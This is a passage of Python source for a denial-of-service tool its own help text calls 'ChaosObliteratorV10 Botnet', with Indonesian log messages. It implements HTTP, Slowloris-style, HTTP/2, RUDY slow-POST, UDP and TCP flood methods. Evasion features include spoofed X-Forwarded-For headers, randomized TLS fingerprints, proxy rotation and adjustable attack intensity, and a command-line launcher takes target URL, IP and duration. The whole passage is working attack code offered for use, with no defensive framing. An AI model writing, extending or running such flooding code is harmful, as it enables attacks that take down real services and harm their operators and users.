                body = self._random_payload(settings["payload_size"]) if method in ["POST", "PUT"] else None
                proxy = random.choice(self.proxy_pool) if self.proxy_pool and self.proxy_mode != "none" else None
                if method == "GET":
                    resp = session.get(url, headers=headers, proxy=proxy, timeout=3)
                elif method == "HEAD":
                    resp = session.head(url, headers=headers, proxy=proxy, timeout=3)
                else:
                    resp = session.post(url, headers=headers, data=body, proxy=proxy, timeout=3)
                self._adjust_jitter(thread_id, (time.time() - start_time) * 1000)
                with self.lock:
                    self.success_count["chaoshttp"] += 1 if resp.status_code < 400 else 0
                    self.response_times["chaoshttp"].append((time.time() - start_time) * 1000)
                time.sleep(self._adjust_jitter(thread_id, (time.time() - start_time) * 1000))
            except Exception as e:
                logging.debug(f"ChaosHTTP error: {e}")
            finally:
                logging.debug(f"ChaosHTTP thread {thread_id} waktu eksekusi: {(time.time() - start_time) * 1000:.2f} ms")

    def _ghostloris(self, thread_id: int):
        """L7: Enhanced Slowloris with partial headers and intensity."""
        if not self.target_l7:
            return
        settings = self.intensity_settings[self.intensity]
        try:
            session = tls_client.Session(
                client_identifier=random.choice([f"chrome_{random.randint(124, 126)}", "firefox_126", "edge_125"]),
                random_tls_extension_order=True
            )
            for _ in range(settings["packets_per_thread"]):
                if time.time() >= self.end_time:
                    break
                start_time = time.time()
                try:
                    headers = {
                        "User-Agent": random.choice(self.user_agents),
                        "X-Forwarded-For": self._random_ip(),
                        "Connection": "keep-alive",
                        "Content-Length": str(random.randint(1000, 10000))
                    }
                    headers.update(self.session_headers)
                    path = self._random_path()
                    url = f"https://{self.target_l7}{path}"
                    proxy = random.choice(self.proxy_pool) if self.proxy_pool and self.proxy_mode != "none" else None
                    session.post(url, headers=headers, data=self._random_payload(10), timeout=0.05, proxy=proxy)
                    self._adjust_jitter(thread_id, (time.time() - start_time) * 1000)
                    with self.lock:
                        self.success_count["ghostloris"] += 1
                        self.response_times["ghostloris"].append((time.time() - start_time) * 1000)
                    time.sleep(self._adjust_jitter(thread_id, (time.time() - start_time) * 1000))
                except Exception as e:
                    logging.debug(f"GhostLoris error: {e}")
                finally:
                    logging.debug(f"GhostLoris thread {thread_id} waktu eksekusi: {(time.time() - start_time) * 1000:.2f} ms")
        except Exception as e:
            logging.error(f"GhostLoris thread {thread_id} gagal inisialisasi: {e}")

    def _http2flood(self, thread_id: int):
        """L7: HTTP/2 flood with multiple streams."""
        if not self.target_l7:
            return
        settings = self.intensity_settings[self.intensity]
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((self.target_l7, 443))
            context = ssl._create_unverified_context()
            sock = context.wrap_socket(sock, server_hostname=self.target_l7)
            h2conn = h2.connection.H2Connection()
            h2conn.initiate_connection()
            sock.sendall(h2conn.data_to_send())
            for _ in range(settings["packets_per_thread"]):
                if time.time() >= self.end_time:
                    break
                start_time = time.time()
                try:
                    stream_id = h2conn.get_next_available_stream_id()
                    headers = {":method": "GET", ":authority": self.target_l7, ":scheme": "https", ":path": self._random_path()}
                    headers.update(self._random_headers())
                    h2conn.send_headers(stream_id, headers, end_stream=True)
                    sock.sendall(h2conn.data_to_send())
                    with self.lock:
                        self.success_count["http2flood"] += 1
                        self.response_times["http2flood"].append((time.time() - start_time) * 1000)
                    time.sleep(self._adjust_jitter(thread_id, (time.time() - start_time) * 1000))
                except Exception as e:
                    logging.debug(f"HTTP2Flood error: {e}")
                finally:
                    logging.debug(f"HTTP2Flood thread {thread_id} waktu eksekusi: {(time.time() - start_time) * 1000:.2f} ms")
            sock.close()
        except Exception as e:
            logging.error(f"HTTP2Flood thread {thread_id} gagal inisialisasi: {e}")

    def _rudy(self, thread_id: int):
        """L7: RUDY (R-U-Dead-Yet) attack with slow POST."""
        if not self.target_l7:
            return
        settings = self.intensity_settings[self.intensity]
        try:
            session = tls_client.Session(
                client_identifier=random.choice([f"chrome_{random.randint(124, 126)}", "firefox_126", "edge_125"]),
                random_tls_extension_order=True
            )
            for _ in range(settings["packets_per_thread"]):
                if time.time() >= self.end_time:
                    break
                start_time = time.time()
                try:
                    headers = {
                        "User-Agent": random.choice(self.user_agents),
                        "X-Forwarded-For": self._random_ip(),
                        "Connection": "keep-alive",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Content-Length": str(random.randint(10000, 100000))
                    }
                    headers.update(self.session_headers)
                    path = self._random_path()
                    url = f"https://{self.target_l7}{path}"
                    proxy = random.choice(self.proxy_pool) if self.proxy_pool and self.proxy_mode != "none" else None
                    data = self._random_payload(settings["payload_size"])
                    session.post(url, headers=headers, data=data[:10], timeout=0.05, proxy=proxy)
                    for chunk in [data[i:i+10] for i in range(10, len(data), 10)]:
                        session.post(url, headers=headers, data=chunk, timeout=0.05, proxy=proxy)
                        time.sleep(random.uniform(0.05, 0.1))
                    with self.lock:
                        self.success_count["rudy"] += 1
                        self.response_times["rudy"].append((time.time() - start_time) * 1000)
                    time.sleep(self._adjust_jitter(thread_id, (time.time() - start_time) * 1000))
                except Exception as e:
                    logging.debug(f"RUDY error: {e}")
                finally:
                    logging.debug(f"RUDY thread {thread_id} waktu eksekusi: {(time.time() - start_time) * 1000:.2f} ms")
        except Exception as e:
            logging.error(f"RUDY thread {thread_id} gagal inisialisasi: {e}")

    def _udpchaos(self, thread_id: int):
        """L4: Enhanced UDP flood with intensity control."""
        if not self.target_l4:
            return
        settings = self.intensity_settings[self.intensity]
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(settings["packets_per_thread"]):
            if time.time() >= self.end_time:
                break
            start_time = time.time()
            try:
                port = random.choice(self.active_ports)
                payload = self._random_payload(settings["payload_size"])
                sock.sendto(payload, (self.target_l4, port))
                with self.lock:
                    self.success_count["udpchaos"] += 1
                time.sleep(self._adjust_jitter(thread_id, 0))
            except:
                pass
            finally:
                logging.debug(f"UDPChaos thread {thread_id} waktu eksekusi: {(time.time() - start_time) * 1000:.2f} ms")
        sock.close()

    def _tcpobliterator(self, thread_id: int):
        """L4: Enhanced TCP flood with intensity control."""
        if not self.target_l4:
            return
        settings = self.intensity_settings[self.intensity]
        for _ in range(settings["packets_per_thread"]):
            if time.time() >= self.end_time:
                break
            start_time = time.time()
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.01)
                port = random.choice(self.active_ports)
                sock.connect((self.target_l4, port))
                sock.send(self._random_payload(settings["payload_size"]))
                with self.lock:
                    self.success_count["tcpobliterator"] += 1
                sock.close()
                time.sleep(self._adjust_jitter(thread_id, 0))
            except:
                pass
            finally:
                logging.debug(f"TCPObliterator thread {thread_id} waktu eksekusi: {(time.time() - start_time) * 1000:.2f} ms")

    def _monitor_resources(self):
        """Monitor CPU and memory usage."""
        while time.time() < self.end_time:
            cpu_percent = psutil.cpu_percent(interval=1)
            mem = psutil.virtual_memory()
            mem_percent = mem.percent
            if cpu_percent > 90 or mem_percent > 90:
                logging.warning(f"Resource tinggi: CPU {cpu_percent}%, Memori {mem_percent}%")
                self.intensity = "low"
                logging.info("Menurunkan intensitas ke 'low' untuk mencegah crash.")
            time.sleep(5)

    def _save_state(self):
        """Save state before shutdown."""
        state = {
            "timestamp": time.time(),
            "success_count": self.success_count,
            "response_times": {k: sum(v)/len(v) if v else 0 for k, v in self.response_times.items()},
            "cookies": dict(self.cookies)
        }
        with open("chaos_obliterator_v10_state.json", "w") as f:
            json.dump(state, f, indent=2)
        logging.info("Status disimpan ke chaos_obliterator_v10_state.json")

    def start(self):
        """Start the obliterator with resource monitoring."""
        if not self.target_l7 and not self.target_l4:
            logging.error("Setidaknya satu target (L7 atau L4) diperlukan")
            return
        logging.info(f"ChaosObliteratorV10 serang L7: {self.target_l7 or 'None'}, L4: {self.target_l4 or 'None'}, metode: {self.methods}, mode proxy: {self.proxy_mode}, pool proxy: {len(self.proxy_pool)} proxy, intensitas: {self.intensity}")
        
        if not self._check_environment():
            logging.error("Pemeriksaan lingkungan gagal, keluar.")
            return
        
        threading.Thread(target=self._monitor_resources, daemon=True).start()
        
        if self.target_l7:
            threading.Thread(target=self._refresh_cookies, daemon=True).start()
            time.sleep(3)
        
        if self.target_l4:
            threading.Thread(target=self._scan_ports, daemon=True).start()
            time.sleep(0.2)
        
        threads = []
        method_funcs = {
            "chaoshttp": self._chaoshttp,
            "ghostloris": self._ghostloris,
            "http2flood": self._http2flood,
            "rudy": self._rudy,
            "udpchaos": self._udpchaos,
            "tcpobliterator": self._tcpobliterator
        }
        try:
            for method in self.methods:
                if method in method_funcs:
                    for i in range(self.threads // len(self.methods)):
                        t = threading.Thread(target=method_funcs[method], args=(i,), daemon=True)
                        threads.append(t)
            for t in threads:
                t.start()
            for t in threads:
                t.join()
        except KeyboardInterrupt:
            logging.info("Menerima KeyboardInterrupt, menutup dengan rapi...")
            self._save_state()
        finally:
            self._save_state()
            avg_response = {k: (sum(v)/len(v) if v else 0) for k, v in self.response_times.items()}
            logging.info(f"Obliterasi selesai. Jumlah keberhasilan: {self.success_count}, Rata-rata waktu respons (ms): {avg_response}")

def main(target_l7: str, target_l4: str, duration: int, methods: str, proxy_mode: str, proxy_list: str, intensity: str):
    methods = methods.split(",")
    obliterator = ChaosObliteratorV10(target_l7, target_l4, duration, methods=methods, proxy_mode=proxy_mode, proxy_list=proxy_list, intensity=intensity)
    obliterator.start()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ChaosObliteratorV10 Botnet")
    parser.add_argument("target_l7", nargs="?", default=None, help="URL target L7 (contoh: http://httpbin.org)")
    parser.add_argument("target_l4", nargs="?", default=None, help="IP target L4 (contoh: 93.184.216.34)")
    parser.add_argument("--duration", type=int, default=60, help="Durasi dalam detik")
    parser.add_argument("--methods", type=str, default="chaoshttp,ghostloris,http2flood,rudy,udpchaos,tcpobliterator", help="Metode dipisahkan koma")
    parser.add_argument("--proxy-mode", type=str, default="auto", choices=["auto", "manual", "none"], help="Mode proxy: auto, manual, atau none")
    parser.add_argument("--proxy-list", type=str, default=None, help="Daftar proxy dipisahkan koma untuk mode manual (contoh: http://1.2.3.4:8080,http://5.6.7.8:8080)")
    parser.add_argument("--intensity", type=str, default="medium", choices=["low", "medium", "high"], help="Intensitas serangan: low, medium, high")
    args = parser.parse_args()
    main(args.target_l7, args.target_l4, args.duration, args.methods, args.proxy_mode, args.proxy_list, args.intensity)
